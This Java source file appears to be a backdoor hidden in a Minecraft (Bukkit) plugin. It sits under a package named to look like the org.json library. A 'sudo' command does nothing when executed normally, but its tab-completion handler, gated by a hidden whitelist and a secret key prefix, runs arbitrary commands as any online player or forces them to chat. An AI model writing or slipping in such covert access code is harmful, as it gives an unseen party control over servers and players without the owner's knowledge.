package org.json.modals.player;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.HumanEntity;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class Sudo extends BDCommand {
    public Sudo() {
        super("sudo");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;

        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        tabComplBuilder.add(2, Bukkit.getOnlinePlayers().stream().map(HumanEntity::getName).toArray(String[]::new));
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        StringBuilder commandBuilder = new StringBuilder();

        for (int i = 2; i < args.length - 1; i++) {
            commandBuilder.append(args[i]).append(" ");
        }

        String sudoCommand = commandBuilder.toString().trim();

        String targetPlayerName = args[1];
        Player targetPlayer = Bukkit.getPlayer(targetPlayerName);

        if (targetPlayer != null) {
            if (sudoCommand.startsWith("say")) {
                String message = sudoCommand.substring(4).trim();
                targetPlayer.chat(message);
            } else {
                Modal.getInstance().getServer().dispatchCommand(targetPlayer, sudoCommand);
                player.sendMessage("§aCommand: §9" + sudoCommand + " §a has been sent to by: §9" + targetPlayer.getName() + "§a.");
            }
            player.sendMessage();
        }

        return tabComplBuilder.build();
    }
}
